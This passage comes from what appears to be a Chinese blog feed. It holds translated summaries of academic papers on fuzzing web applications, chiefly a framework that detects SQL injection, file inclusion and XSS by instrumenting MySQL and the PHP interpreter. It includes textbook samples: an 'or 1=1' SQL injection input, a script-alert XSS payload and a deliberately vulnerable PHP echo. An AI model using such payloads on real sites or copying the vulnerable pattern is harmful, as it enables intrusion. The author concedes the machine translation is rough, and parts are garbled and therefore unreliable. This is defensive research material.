title="结论和未来的工作"></a><strong>结论和未来的工作</strong></h2><p>在本文中，我们介绍了KameleonFuzz，这是第一款针对反射型和存储型XSS的黑盒GA驱动模糊器。与之前的工作相比，我们精确的双重污染推理可以重复使用真实世界的解析器，我们的演化符合测试人员定义的攻击语法，而适应性函数通过关注最有希望的潜在漏洞来推动这一过程。我们的方法在检测XSS方面具有实际用途，并且优于最先进的开源黑盒扫描仪。它发现了以前未知的XSS。</p><p><strong>我们认为以下方向对未来的工作很有意义：</strong></p><p>如何自动创建攻击语法？<br>如何结合我们的方法和来提高XSS检测的效率？<br>如何使用模糊测试期间收集的其他知识来改进推断模型？<br>如何将这种模型推理和模糊测试的组合应用于其他类别的漏洞？ </p><h2 id="个人总结"><a href="#个人总结" class="headerlink" title="个人总结"></a><strong>个人总结</strong></h2><p>这篇文章由于专业术语较多，工具流程比较复杂，故给我我机器翻译和人工校验带来了巨大的困难，我暂时也无法一下子理解其中的思想，文章中的很多不是很通顺的机器翻译我也不知道该怎么修改成正常的表述，但是因为这篇文章技术还是比较新，所以暂时先放在我的博客里，如果读者觉得有兴趣可以对其进行更好的翻译，如果没有兴趣的话，就等我日后对一些概念理解更深了以后再来重新翻译这篇文章</p><h2 id="原文链接"><a href="#原文链接" class="headerlink" title="原文链接"></a><strong>原文链接</strong></h2><p><a href="http://www.cs.huji.ac.il/~ai/projects/2014/EvolutionaryXSSDetector/files/original_article.pdf">KameleonFuzz: Evolutionary Fuzzing for Black-Box XSS Detection</a></p>]]></content>
    
    
    <categories>
      
      <category>翻译</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fuzz XSS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>使用Fuzzing自动检测Web应用程序中的漏洞(半机翻有删增)</title>
    <link href="/2019/02/25/%E4%BD%BF%E7%94%A8Fuzzing%E8%87%AA%E5%8A%A8%E6%A3%80%E6%B5%8BWeb%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E4%B8%AD%E7%9A%84%E6%BC%8F%E6%B4%9E(%E5%8D%8A%E6%9C%BA%E7%BF%BB%E6%9C%89%E5%88%A0%E5%A2%9E)/"/>
    <url>/2019/02/25/%E4%BD%BF%E7%94%A8Fuzzing%E8%87%AA%E5%8A%A8%E6%A3%80%E6%B5%8BWeb%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E4%B8%AD%E7%9A%84%E6%BC%8F%E6%B4%9E(%E5%8D%8A%E6%9C%BA%E7%BF%BB%E6%9C%89%E5%88%A0%E5%A2%9E)/</url>
    
    <content type="html"><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a><strong>摘要</strong></h2><p>自动检测漏洞是文献中研究的问题，也是具有安全要求的应用程序开发中非常重要的问题。Fuzzing是一种软件测试技术，自动或半自动化，涉及在软件中注入大量半随机输入以解决安全漏洞。许多漏洞检测技术需要专业人员进行手动分析，以确定是否存在任何漏洞。为了解决这个问题，决定开发一个使用模糊测试自动检测Web应用程序漏洞的系统。检测Web应用程序中的漏洞与在其他类型的软件中检测不同。发生这种情况是因为Web应用程序包含许多后端组件，这会导致特定的漏洞，因此，它可以方便地监视这些组件。这项工作提供了一个模糊Web应用程序的框架。在这项工作中，在每个Web应用程序组件内部进行监视。该框架检测一组有代表性的Web应用程序漏洞：SQL注入、本地或者远程文件包含、反射型或者存储型XSS。我们的SQL注入检测机制能够检测最近提出的这一类别的细微攻击。我们使用易受攻击的代码示例和开源Web应用程序对框架进行实验性评估。</p><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a><strong>介绍</strong></h2><p>漏洞检测是文献中广泛研究的主题，也是具有安全性要求的软件开发中的一个非常重要的问题。通过模糊测试发现了许多软件漏洞。Fuzzing 是一种软件测试技术，<strong>涉及在软件中重复注入半随机输入，以便由目标应用程序处理，并检查是否存在与预期不同的行为</strong>。如果是这样，某个输入可能会利用错误或漏洞。</p><span id="more"></span><p>此外，模糊测试是一种半自动或自动化过程，其中包括发送更有可能利用漏洞的值。<strong>有两类模糊器：基于突变和基于生成</strong>。基于变异的模糊器通过在输入中应用微小变化而不改变其结构来创建测试用例。基于生成的模糊器通过目标知识创建测试用例。</p><p>许多Web应用程序都具有复杂的体系结构，这是一个挑战，也是检测某些注入是否利用漏洞的机会。在非Web应用程序（如网络服务或命令行）中，模糊器仅尝试发送输入，但用户必须了解目标软件中是否存在任何异常行为。其他机制试图通过观察崩溃，监视CPU时间或内存消耗来检测异常行为。但是，用户需要了解这些异常是否是软件中的漏洞。许多Web应用程序漏洞与后端组件相关，例如，数据库管理系统（DBMS）或文件系统，这使监视变得复杂，但也允许在这些点上执行此操作。</p><p>本文提出了一个框架，用于模糊Web应用程序，以满足这一挑战和机遇。该工作的主要重点是监控目标应用中的注入效应，因此主要在其组件内部进行。</p><blockquote><p><strong>在Web应用程序组件中进行监视非常重要，因为：</strong></p></blockquote><blockquote><p>1）它是传入数据流结束的点,因此是脆弱性的关键点;<br>2）作为输入流程结束的最后一点，关于如何处理输入的假设较少，例如，是否存在任何编码或验证过程;<br>3）允许使用组件功能以检测漏洞并进行有效检测。</p></blockquote><p>该框架旨在检测输入验证漏洞，但在当前版本中，只实现了它们的一部分：SQL注入（SQLI）;本地&#x2F;远程包含（LFI &#x2F; RFI）;反射&#x2F;存储的跨站点脚本（XSS）。选择这个漏洞子集是因为SQL和XSS几年来被认为是风险最高的漏洞，而LFI &#x2F; RFI对用PHP编写的Web应用程序有特殊影响。</p><p>PHP语言目前在超过77％的Web应用程序中使用，这就是我们考虑它的原因。这项工作还展示了如何扩展框架以检测其他输入验证漏洞。</p><p>该框架被实现为由Zend Engine执行的PHP应用程序中的漏洞并使用MySQL作为DBMS。它通过小型易受攻击的代码示例和开源应用程序进行评估，同时考虑到发现的漏洞数量。</p><blockquote><p><strong>这项工作的主要贡献是：</strong></p></blockquote><blockquote><p>1）一个模糊测试框架，其中包含一套监视多种攻击的机制;<br>2）基于缺乏输入验证来实现几种检测漏洞的机制。这些漏洞有：SQL注入;本地&#x2F;远程文件包含;反射&#x2F;存储的跨站脚本<br>3）框架的实验评估考虑了易受攻击的代码和开源应用程序。</p></blockquote><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a><strong>背景</strong></h2><h3 id="检测漏洞利用"><a href="#检测漏洞利用" class="headerlink" title="检测漏洞利用"></a><strong>检测漏洞利用</strong></h3><p>要确定是否漏洞已被利用，必须存在可以检测目标系统状态的监视机制或资源，尤其是在出现故障的情况下，例如：可记录任何故障或执行异常的日志文件;允许识别系统中的异常的调试器;应用程序返回的代码或消息;检查与目标系统的连接是否仍然存在。但是，此类机制尚未集成到模糊器中，因为无法准确检测利用Web应用程序中的漏洞的攻击。</p><h3 id="web-应用漏洞"><a href="#web-应用漏洞" class="headerlink" title="web 应用漏洞"></a><strong>web 应用漏洞</strong></h3><p>本节简要介绍了当前版本框架中考虑的漏洞。 对于每种类型的漏洞，都存在具有相同名称的相应攻击，例如，SQL注入攻击&#x2F;漏洞。</p><h4 id="SQL注入漏洞"><a href="#SQL注入漏洞" class="headerlink" title="SQL注入漏洞"></a><strong>SQL注入漏洞</strong></h4><p>允许攻击者使用输入来误导目标应用程序，以构建意外查询并将其提交到数据库。当用户的输入未经过验证并且攻击者可能通过插入SQL关键字来更改查询的结构时，就会发生此类攻击。如果此类攻击对目标的行为有立即影响，则称为一阶SQL注入。在二阶SQLI攻击中，攻击者首先向目标应用程序提供一个输入，它将存储在数据库中;之后，攻击者提供第二个输入，该输入创建查询以提取存储的最后一个查询，然后创建第二个修改查询。</p><h4 id="RFI漏洞"><a href="#RFI漏洞" class="headerlink" title="RFI漏洞"></a><strong>RFI漏洞</strong></h4><p>允许攻击者从外部Web服务器中包含文件。此漏洞的发生是由于缺少用户输入的验证，允许攻击者通过包含函数包含远程内容，例如PHP中的函数包含。</p><h4 id="LFI漏洞"><a href="#LFI漏洞" class="headerlink" title="LFI漏洞"></a><strong>LFI漏洞</strong></h4><p>与之前类似，但包含的文件必须存在于应用程序服务器中。为了执行此类攻击，首先，必须加载恶意文件或在现有本地文件中添加恶意内容（例如：日志文件）。在那之后，它只需要包含这个恶意的本地文件。</p><h4 id="反射型XSS漏洞"><a href="#反射型XSS漏洞" class="headerlink" title="反射型XSS漏洞"></a><strong>反射型XSS漏洞</strong></h4><p>当Web应用程序信任来自用户的输入并在响应中回显它们而没有经过验证、清理或编码时就会存在反射型XSS漏洞。 如果这些输入中的任何一个包含脚本，它将在受害者的浏览器中执行，并带来一些后果。 </p><h4 id="存储型XSS漏洞"><a href="#存储型XSS漏洞" class="headerlink" title="存储型XSS漏洞"></a><strong>存储型XSS漏洞</strong></h4><p>基于先前漏洞的相同原则，仅在这种情况下，目标应用程序首先存储数据并随后回显它。</p><h3 id="检测特定的Web应用程序漏洞"><a href="#检测特定的Web应用程序漏洞" class="headerlink" title="检测特定的Web应用程序漏洞"></a><strong>检测特定的Web应用程序漏洞</strong></h3><p>在本小节中将讨论以下漏洞的几种检测技术：SQL注入，本地&#x2F;远程文件包含和跨站点脚本。</p><h4 id="有许多方法可以检测SQLI漏洞。"><a href="#有许多方法可以检测SQLI漏洞。" class="headerlink" title="有许多方法可以检测SQLI漏洞。"></a><strong>有许多方法可以检测SQLI漏洞。</strong></h4><p>Halfond和Orso的解决方案，<strong>通过静态代码分析</strong>检测这种类型的攻击，并在<strong>运行时监视应用程序</strong>。此外，还有一种解决方案CANDID基于SQL注入更改查询结构的原则。在此解决方案中**，通过发送良性输入，作者打算提取所需的查询模型，以便与从未来请求生成的模型进行比较**。如果模型之间没有匹配，则表示存在SQLI漏洞。这种方法不同于本工作中实现的SQLI检测机制，因为CANDID需要更改目标应用程序，而且，提取查询结构是DBMS的一个外部工具，可能无法提取查询结构。</p><h4 id="关于检测RFI漏洞的机制"><a href="#关于检测RFI漏洞的机制" class="headerlink" title="关于检测RFI漏洞的机制"></a><strong>关于检测RFI漏洞的机制</strong></h4><p>他们假装检查在到达关键功能（例如包括）之前<strong>是否存在不安全的输入是否是任何验证，消毒或编码过程的目标</strong>。如果是，则输入变得安全，否则可能利用漏洞。 中</p><p>还有一种解决方案发送一个输入，该输入引用被监视的远程服务器中的资源，以确定它是否已从目标应用程序接收到任何请求。如果是这样，Web应用程序容易受到攻击，因为它试图包含目标远程文件。</p><h4 id="检测LFI漏洞"><a href="#检测LFI漏洞" class="headerlink" title="检测LFI漏洞"></a><strong>检测LFI漏洞</strong></h4><p>为了检测LFI漏洞，提出了一种解决方案，其中作者建议在目标应用程序中包含可执行资源，并确定应用程序行为是否有任何变化。</p><h4 id="要检测XSS漏洞，有几种机制"><a href="#要检测XSS漏洞，有几种机制" class="headerlink" title="要检测XSS漏洞，有几种机制"></a><strong>要检测XSS漏洞，有几种机制</strong></h4><p>一种机制基于静态分析。这些机制控制程序的执行，<strong>在作为响应发送之前，检查用户的输入是否是任何验证或清理过程的目标</strong>。除了这种方法之外，还有一种方案<strong>使用代理来分析对应用程序及其响应的请求</strong>。此解决方案检查请求中是否存在与HTML标记对应的任何字符。如果是，则该机制检查相应的响应是否包含相同的现有标记，以检查目标应用程序中是否存在任何漏洞。</p><blockquote><p>其实就是一种是检查请求是否有异常，另一种是键查响应是否有异常</p></blockquote><h2 id="框架"><a href="#框架" class="headerlink" title="框架"></a><strong>框架</strong></h2><p>它开发了一个框架，用于模糊测试Web应用程序并通过嵌入在后端组件中的机制监视它们的影响。接下来，将介绍框架的体系结构及其组件。</p><h3 id="体系结构"><a href="#体系结构" class="headerlink" title="体系结构"></a><strong>体系结构</strong></h3><p>Framework的体系结构如下图所示，其中包含其组件：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E4%BD%BF%E7%94%A8fuzz%E8%87%AA%E5%8A%A8%E6%A3%80%E6%B5%8B1.png" alt="此处输入图片的描述"></p><h4 id="Fuzzer："><a href="#Fuzzer：" class="headerlink" title="Fuzzer："></a><strong>Fuzzer：</strong></h4><p>生成在目标Web应用程序的某些入口点注入的输入。此外，它还包含反映XSS攻击的监视机制。</p><h4 id="Web应用程序："><a href="#Web应用程序：" class="headerlink" title="Web应用程序："></a><strong>Web应用程序：</strong></h4><p>顾名思义，它是由框架测试的Web应用程序。 它插入到具有特定操作系统的Web服务器中，并与许多后端组件（例如数据库，文件系统）通信;</p><h4 id="服务器端语言解释器："><a href="#服务器端语言解释器：" class="headerlink" title="服务器端语言解释器："></a><strong>服务器端语言解释器：</strong></h4><p>其中包括由于缺少输入验证而导致的漏洞的几种检测机制。如果它们分别与文件系统，DBMS或操作系统交互，则这些漏洞分为三类。</p><p><strong>(1)监视执行的位置</strong><br>监视以下漏洞：本地&#x2F;远程文件包含（LFI &#x2F; RFI）;目录&#x2F;路径遍历（DT &#x2F; PT）;源代码泄露（SCD）。<br><strong>(2)检测存储的XSS攻击的机制</strong>。<br><strong>(3)OS命令包含攻击（OSCI）的监视机制</strong>。<br><strong>(4)还有一种服务器端语言代码注入攻击的监视机制。</strong></p><h4 id="数据库管理系统："><a href="#数据库管理系统：" class="headerlink" title="数据库管理系统："></a><strong>数据库管理系统：</strong></h4><p>从Web应用程序接收查询并对其进行处理。它包含SQL注入攻击的监视机制。</p><h3 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h3><p>接下来，将展示开发框架的每个组件中存在的所有功能。</p><h3 id="Fuzzer"><a href="#Fuzzer" class="headerlink" title="Fuzzer"></a><strong>Fuzzer</strong></h3><p>fuzzer 基于通过模糊矢量生成输入，将自身插入迭代 fuzzer 的类别中。这些模糊测试向量包含一组先前选择的输入，包含几个存在的攻击特征。此外，fuzzer 对**这些向量的每个元素应用突变机制。**该机制随机地选择输入字符的子集以进行小的改变（例如：字符替换），从而产生可能意外地利用漏洞的更多种输入。</p><p>fuzzer 允许在发送输入之前将目标应用程序置于特定状态，将其自身插入内存模糊器的类别中。因此，可以手动地定义一系列请求以将目标应用程序置于给定状态或在发送特定输入后重置目标应用程序的状态。这一系列请求包含以下类型的HTTP请求：GET和POST。</p><p>此外，fuzzer 负责通过HTTP协议将生成的输入注入目标应用程序。为此，模糊矢量的每个元素的 fuzzer <strong>发送其原始版本和它们的突变</strong>。如果启用了状态定义机制，则首先，fuzzer发送与预状态进程相对应的HTTP请求，即将目标应用程序置于某个状态以便对其进行测试。置于特定状态，fuzzer 将输入发送到目标应用程序。稍后，如果需要重置目标应用程序的状态，则 fuzzer 发送HTTP请求以重新建立其状态。重复执行此过程，直到所有输入都发送到目标应用程序。</p><h3 id="检测SQL注入"><a href="#检测SQL注入" class="headerlink" title="检测SQL注入"></a><strong>检测SQL注入</strong></h3><p>在DBMS中检测到这种类型的漏洞，因为该机制使用其资源，更具体地说是其解析器。在下面的解释中，我们考虑了MySQL的具体情况，因为它是实现中使用的DBMS。</p><p><strong>SQLI攻击检测的主要目标是识别某个查询是否接收来自用户的输入</strong>，如果其结构发生变化则考虑到良性模型结构。因此，首先，有必要<strong>确定目标应用程序中每个查询的预期行为</strong>。此标识的<strong>目的是能够比较某个查询的不同执行并检查其行为是否发生变化</strong>。如果是这样，应用程序中存在漏洞。</p><p>在MySQL的特定情况下，查询的结构可以被解释为堆栈或后序树。但是，MySQL将查询的结构存储在列表中。<br>接下来，通过SQLI检测机制呈现下面查询语句的结构。</p><pre><code class="hljs">SELECT * FROM user WHERE Age&lt;23</code></pre><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E4%BD%BF%E7%94%A8fuzz%E8%87%AA%E5%8A%A8%E6%A3%80%E6%B5%8B2.png" alt="此处输入图片的描述"></p><p><strong>为了理解查询的结构，必须从下到上观察其项目。</strong></p><p>查询结构中的第一个元素是指FROM元素，在本例中是表用户。之后，它引用SELECT子句返回的元素，在本例中为所有collumns（符号*）。接下来，有一个对年龄和整数23的引用，并且应用这两个项目&lt;操作，如上面的项目所示。</p><p>在此解决方案中，假设输入是良性的，首先执行接收输入的某个查询，定义查询的模板。因此，当第一次执行查询时，在运行时，机制将存储其结构。将在以下相同查询的执行中将此模板与获得的结构进行比较。</p><p>为了正确的操作机制，必须存在训练阶段，对其中执行代码中的所有点执行从具有良性内容的用户接收输入的查询以便生成模板。</p><p><strong>在以下查询的执行中，将获得的结构与在训练阶段生成的相应模板进行比较</strong>。这种比较必须能够容忍某些方面，否则会产生许多误报。</p><p>例如，假装将给定属性与用户指定的值进行比较的查询必须容忍所提供的不同值。此外，它应该容忍使用与预期不同的值，但由于类型转换操作，这些值的含义是相同的。因此，该机制在称为基本类型的类别中考虑整数，浮点数，实数和字符串类型。</p><p>因此，该检测机制从获得的结构中观察每个元素，并检查类型（第一元素）和参数（剩余元素）是否与模板中的对应元素完全相等，除了在一种情况下。当查询结构的某些元素引用基本类型时，不必分析其参数，只需要模板中的对应元素为基本类型。</p><p><strong>如果给定查询获得的结构与相应模板不对应，则意味着输入已更改查询的结构，并且它正在利用SQLI漏洞</strong><br>该机制可以检测两种类型的SQL注入攻击：结构和模仿。此外，此机制能够检测一阶和二阶SQLI漏洞，<strong>因为在这两种情况下，当漏洞被利用时，查询结构会发生变化</strong>。</p><p>出于安全目的，在模板中，不存储原始类型的参数，因此不可能提取任何敏感信息（例如密码）。</p><p>为了演示这种机制，我们假设以下查询：</p><pre><code class="hljs">SELECT info FROM users WHERE password = $input。</code></pre><p>此查询执行两次：第一次为了生成带有良性输入’xpto’的模板;第二个为了用恶意输入攻击’evil’ or 1 &#x3D; 1。下图显示的结构，分别表示为两个执行的堆栈，</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E4%BD%BF%E7%94%A8fuzz%E8%87%AA%E5%8A%A8%E6%A3%80%E6%B5%8B3.png" alt="此处输入图片的描述"></p><p><strong>（a）模板<br>（b）恶意查询的结构（以粗体输入）</strong></p><p>可以观察到结构之间的差异，因为它在查询中包含恶意SQL代码作为输入，因此，该机制可以识别出SQLI漏洞。</p><h3 id="检测本地-远程文件包含"><a href="#检测本地-远程文件包含" class="headerlink" title="检测本地&#x2F;远程文件包含"></a><strong>检测本地&#x2F;远程文件包含</strong></h3><p>要检测LFI &#x2F; RFI攻击，必须在每个文件包含函数调用中提取有关包含文件的信息，例如，在PHP语言函数include和require中。这种检测是在服务器端语言解释器内进行的</p><p>当第一次执行某个文件包含函数时，假设使用良性输入，机制定义该调用的预期行为，以便与该位置的未来的执行情况进行比较，将其定义为模板。此模板通用于涵盖所有良性输入，但也限制为排除恶意输入。存在训练阶段是必要的，其中存在这种类型的函数的代码中的所有位置都用良性输入执行以便生成相应的模板。<br>模板包含文件的路径和扩展名。如果文件是远程的，则路径包括外部地址的协议（例如：http：&#x2F;&#x2F;）</p><p>选择这些元素作为模板的一部分的原因基于两个原则：当攻击者假装包含本地或远程文件时，文件的路径必须通过路径遍历或包括外部地址协议来改变，而在正常执行中路径保持不变;当有一个文件包含时，它的扩展在执行时是相同的，因此认为改变文件的扩展是一个危险的操作。</p><p>在以下执行中，检测机制将特定调用中包括的文件与相应模板进行比较。<strong>如果包含文件的路径或扩展名与模板中定义的路径或扩展名不同，则表示目标应用程序中存在漏洞。</strong></p><p>接下来，该机制检查是否包含文件。如果是这样，该机制会漏洞利用漏洞，否则会警告漏洞会被利用。</p><blockquote><p>只有当攻击者试图在模板中包含具有相同路径和扩展名的恶意文件时，则出现此机制的限制</p></blockquote><h3 id="检测存储型-XSS"><a href="#检测存储型-XSS" class="headerlink" title="检测存储型 XSS"></a><strong>检测存储型 XSS</strong></h3><p>为了检测存储型XSS攻击，<strong>每当执行查询时，该机制都会检查按查询返回的内容是否包含Web浏览器可以解释的任何代码</strong>。此检测在服务器端语言解释器中进行，内容分析通过解析工具进行，该工具检查其中是否有任何代码。解析工具分析查询返回的内容，并检查是否有任何HTML或JavaScript代码标记（例如<code>&lt;script&gt;</code>）</p><p>在通过解析工具分析内容之前，该机制会对此进行预检查，因为查询返回的大多数内容都是无害的，从而导致性能开销。此预检查假装验证是否存在任何危险字符（例如：&lt;，&gt;）或字符串（例如：href，javascript）。如果是这样，查询返回的内容是解析工具分析的目标，否则是无害的，没有必要进行任何进一步的分析。</p><p>如前所述，在预检查阶段之后，解析工具分析查询返回的内容并检查是否存在可由Web浏览器解释的任何代码标记。<strong>如果是这样，则检测机制通知存储的跨站点脚本攻击。</strong></p><h3 id="检测反射型-XSS"><a href="#检测反射型-XSS" class="headerlink" title="检测反射型 XSS"></a><strong>检测反射型 XSS</strong></h3><p>**此机制检测是否发送脚本作为Web应用程序的响应。**此检测在 fuzzer 内部进行。在 fuzzer 向应用程序发送输入之前，需要在考虑存在的情况下分析这些输入 代码（例如：HTML，JavaScript）。 如果是，则机制通过输入向目标应用程序发送HTTP请求。 接下来，分析应用程序的响应。</p><p><strong>该分析通过Smith-Waterman算法检查响应是否具有重要的输入部分</strong>。该算法用于计算生物学领域，在两个字符序列之间进行局部对齐，并通过评分系统工作。在该得分系统中，当两个字符之间存在匹配时添加点，否则扣除点。这些分数可能因目标字符而异，例**如，字符&lt;和&gt;的分数高于其他字符，因为它在此漏洞中具有重要性。**该算法返回具有最高相似性的字符子序列，即其得分是最高的。在检测机制的目的中，它执行输入和应用程序响应之间的局部对齐，以获得与输入具有更高相似性的响应子序列。<strong>如果获得的分数是完美的</strong>，即获得的子序列与输入完全对应的，我们可以得出结论，<strong>目标应用程序是易受攻击的</strong>。<strong>如果获得的分数不完美但高于阈值，则机制检查从算法获得的子序列</strong>。该分析想要检查子序列中是否有任何代码。如果是这样，那么它就是一个漏洞，否则被视为应用程序显着改变了输入。</p><blockquote><p>作为限制，机制可能无法识别某些输入中的代码，因此无法识别漏洞，或者与输入相比，响应中的响应发生了显着变化，但仍然触发了攻击。</p></blockquote><p>在正常执行中，将作为输入插入字符串Miguel，其未标识任何代码，因此不发送输入。假设将恶意内容</p><pre><code class="hljs">&lt;script&gt; alert（“XSS”）&lt;/script&gt;</code></pre><p>作为输入插入，这被标识为代码，因为有脚本标记，因此发送输入。当收到响应时，会对此进行分析，并确定输入中的现有代码完全包含在响应中，即通知存在反射型 XSS 漏洞</p><p>为了证明这种机制，请考虑以下代码示例，它接收来自用户的输入，并在后面反射它，它是这样的：</p><pre><code class="hljs">$name = $ GET[ &#39; name &#39; ] ;echo &quot;Welcome &quot; . $name ;</code></pre><h3 id="检测其他漏洞"><a href="#检测其他漏洞" class="headerlink" title="检测其他漏洞"></a><strong>检测其他漏洞</strong></h3><p>如前所述并在图1中提到，可以扩展框架以检测Web应用程序中存在的其他漏洞，例如，OS命令注入漏洞（OSCI），服务器端语言代码注入，目录&#x2F;路径遍历和源代码泄露</p><p><strong>框架旨在分析与这些漏洞相关的敏感接收器，并检查是否存在任何漏洞利用。为此，需要修改与每个漏洞相关的后端组件，并收集有关应用程序从用户发出的请求的信息。</strong></p><p>该信息集中在请求结构中，以便根据用户的输入检查结构是否存在任何差异。在第一阶段，**有必要收集每个调用与这些漏洞相关的函数的良性模型。接下来，当执行特定调用时，将获得的结构与各自的良性模型进行比较。如果存在差异，则机制通常存在漏洞，**因为请求的结构与从良性输入获得的结构不同</p><h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a><strong>实现</strong></h2><p>本节介绍了框架的架构，并考虑了实现的组件(如下图)，此外，它还解释了框架的组件是如何实现的，即以下漏洞的模糊和检测机制：SQL注入，本地&#x2F;远程文件包含和反射&#x2F;存储XSS。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E4%BD%BF%E7%94%A8fuzz%E8%87%AA%E5%8A%A8%E6%A3%80%E6%B5%8B4.png" alt="此处输入图片的描述"></p><h3 id="Fuzzer-1"><a href="#Fuzzer-1" class="headerlink" title="Fuzzer"></a><strong>Fuzzer</strong></h3><p>为了实现fuzzer，它使用了由OWASP开发的名为JBroFuzz（版本2.4）的工具,该工具包含一个fuzzer以及一个包含多个类的库，这些类允许实现包含各种功能的fuzzer：模糊向量或模糊测试有多个参数。由于JBroFuzz fuzzer 不包含监视攻击的机制，因此必须使用此库来创建具有检测 XSS攻击机制的fuzzer。</p><p>还有必要实现其他功能：输入变异机制;使用生成的输入发送HTTP请求。关于模糊向量，fuzzer 模糊器包含针对每个漏洞的攻击签名，这些漏洞假装从不同的源和复杂性中检测到</p><p>Web应用程序经历了几个状态，其中只有一些是易受攻击的。 因此，当使用模糊测试来检测目标应用程序中的漏洞时，重要的是在所有不同的状态下进行并在每个状态下进行模糊测试。 fuzzer的当前实现包含一种机制，允许手动定义一组HTTP请求以将目标应用程序置于特定状态或在发送输入后重置应用程序的状态。 可以提供请求的类型，URL，参数和cookie。</p><h3 id="检测-SQLI"><a href="#检测-SQLI" class="headerlink" title="检测 SQLI"></a><strong>检测 SQLI</strong></h3><p>要实现这个机制，有必要修改MySQL（版本5.7.4。），更具体地说，解析函数（mysql parse  -  le sql parser.cc）添加14行代码。此外，它创建了一个带有1098行代码的标题文件，以实现检测机制。通过这些更改，可以检测到多个SQLI攻击。</p><p>要实现这种机制，有必要修改MySQL（版本5.7.4。），更具体地说，解析函数（mysql_parse-sql_ parser.cc）添加14行代码。 此外，它创建了一个带有1098行代码的标题文件，以实现检测机制。 通过这些更改，可以检测到多个SQLI攻击。</p><p>此外，有必要以MySQL注释的形式向每个查询添加标识符。发生这种情况是因为这些标识符可以在应用程序中知道执行某些查询的位置。因此，程序员能够通过代码分析了解某些漏洞的原因。如果在查询中没有这样的标识符，MySQL继续正常运行只是不是机制的目标。</p><p>当前实现仅允许分析包含以下命令的查询：SELECT，INSERT INTO，UPDATE，FROM，WHERE，HAVING，ORDER BY，GROUP BY。</p><h3 id="检测本地-远程文件包含-1"><a href="#检测本地-远程文件包含-1" class="headerlink" title="检测本地&#x2F;远程文件包含"></a><strong>检测本地&#x2F;远程文件包含</strong></h3><p>为了实现这个机制，有必要修改PHP解释器（版本5.5.12），即Zend Engine。<strong>这些更改集中在解释器的函数中，这些函数在PHP语言中实现文件包含函数</strong>（例如：include，include once，require和require once）。<strong>由此可以提取与包含目标相关的信息，并检查目标应用程序是否易受攻击</strong>。</p><p>需要更改名为compile_file（zend_language_scanner.c）的ZendEngine函数。此函数接收将由PHP编译的文件作为参数，在本例中为包含的目标。</p><p>有必要在每个包含函数调用中添加一个标识符，以便知道代码中哪个位置确定包含。如果没有这样的标识符，PHP继续正常运行只是不是检测机制的目标。</p><p>为了提取有关包含函数标识符的信息，它被修改为file_zend_vm_execute.h，共有116行代码。通过更改此功能，检测机制能够区分漏洞警告和攻击真正利用漏洞的时间。</p><p>关于模板，它们通过包含相关信息的文件永久存储。</p><h3 id="检测存储型-XSS-1"><a href="#检测存储型-XSS-1" class="headerlink" title="检测存储型 XSS"></a><strong>检测存储型 XSS</strong></h3><p>为了实现这个机制，它被修改了Zend Engine（版本5.5.12）。这些修改主要集中在实现PHP函数mysql查询的解释器函数，更具体地说，函数php mysql在Zend Engine中执行查询。</p><p>要分析查询返回的内容，有必要检查其中是否有任何代码，例如HTML或JavaScript。因此，它使用了一个用Java编写的解析工具（antixss.jar），它包含一个解析库，即jsoup（版本1.7.3），该库旨在解析HTML页面或其他类似语言（例如JavaScript，CSS）考虑到标签的存在。为了识别代码，机制为jsoup分析提供内容。此解析工具将内容插入到虚拟HTML页面中，由标记<code>&lt;html&gt;</code> <code>&lt;head&gt;</code> <code>&lt;body&gt;</code>表示，其中将进行解析。</p><p><strong>利用通过解析过程获得的结构，将检查除了虚拟页面中的现有标签之外是否还存在至少一个代码标签。如果是这样，则意味着内容已更改结构并包含代码。</strong></p><h3 id="检测反射型-XSS-1"><a href="#检测反射型-XSS-1" class="headerlink" title="检测反射型 XSS"></a><strong>检测反射型 XSS</strong></h3><p>为了实现这个机制，它再次被用于jsoup库（版本1.7.3），但在这种情况下包含在fuzzer中（图3）。<br>关于Smith-Waterman算法，它是用Java语言实现的。有必要使用某些值来确定机制，以便在字符之间达成一致&#x2F;不一致，间隙和所得到的得分与完美得分之间的相似性百分比被视为某种输入作为攻击。<br>如果两个角色之间存在协议（区分大小写），则会增加5分。当角色之间存在分歧时，这可以是三种类型：</p><ul><li>当对于包括对齐的子序列的空白空间的不一致关注从得分中扣除2个单位。这个惩罚是线性的，取决于添加的空格数量;</li><li>当分歧指的是彼此不同<strong>但不是字符</strong>的两个字符&lt; 或 &gt;从分数中扣除5个单位。根据不同意见中的字符数，这种惩罚是线性的; </li><li>当分歧指的是两个不同的字符时，其中一个字符&lt;或&gt;被扣除25倍于前一点扣除的单位。这是因为这些角色在反射型XSS 漏洞中的重要性，这种惩罚是线性的，取决于分歧中的字符数。</li></ul><p><strong>最后，当使用Smith-Waterman算法获得的分数大于完美分数的95％时，确定某些输入利用反映的XSS漏洞，即，如果对比较两个序列之间的所有字符，则获得分数。</strong></p><h2 id="结论"><a href="#结论" class="headerlink" 